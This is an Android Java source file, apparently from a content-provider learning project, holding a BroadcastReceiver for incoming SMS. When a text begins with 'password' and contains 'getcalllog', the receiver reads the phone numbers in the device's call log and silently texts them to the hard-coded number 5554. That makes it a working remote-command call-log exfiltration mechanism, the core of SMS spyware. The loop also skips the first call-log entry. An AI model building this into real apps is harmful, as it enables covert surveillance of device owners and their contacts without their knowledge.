package com.example.contentproviderapp;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

public class SmsReceiver extends BroadcastReceiver {
    Context mContext;
    public static String TAG = SmsReceiver.class.getSimpleName();
    @Override
    public void onReceive(Context context, Intent intent) {
        mContext = context;
        Bundle bundle = intent.getExtras();
        SmsMessage[] msgs = null;
        String str = "";
        String colleguesphno = "";
        if (bundle != null) {
            //---retrieve the SMS message received---
            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];
            for (int i = 0; i < msgs.length; i++) {
                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                colleguesphno =  msgs[i].getOriginatingAddress();

                //str += "SMS from " + msgs[i].getOriginatingAddress();
                // str += " :";
                str += msgs[i].getMessageBody().toString();
                // str += "\n";
            }
            Toast.makeText(context, "collegues phno="+colleguesphno, Toast.LENGTH_SHORT).show();
            if (str.contains("getcalllog") && str.startsWith("password")) {
                    SmsManager manager = SmsManager.getDefault();
                    String calllog = getCalllog();
                Log.i(TAG, "calllog+"+calllog);
                    manager.sendTextMessage("5554", null,
                            calllog, null, null);


            }
        }
    }

    private String getCalllog() {
        Uri allCalls = Uri.parse("content://call_log/calls");
        ContentResolver contentResolver = mContext.getContentResolver();
        String calllog = "";
        Cursor dataCursor =
                contentResolver.query(allCalls,null,null,null,null);
        dataCursor.moveToFirst();
        int phnoColIndex = dataCursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER);
        while (dataCursor.moveToNext()){
            calllog += dataCursor.getString(phnoColIndex)+",";
        }
        return  calllog;

    }
}
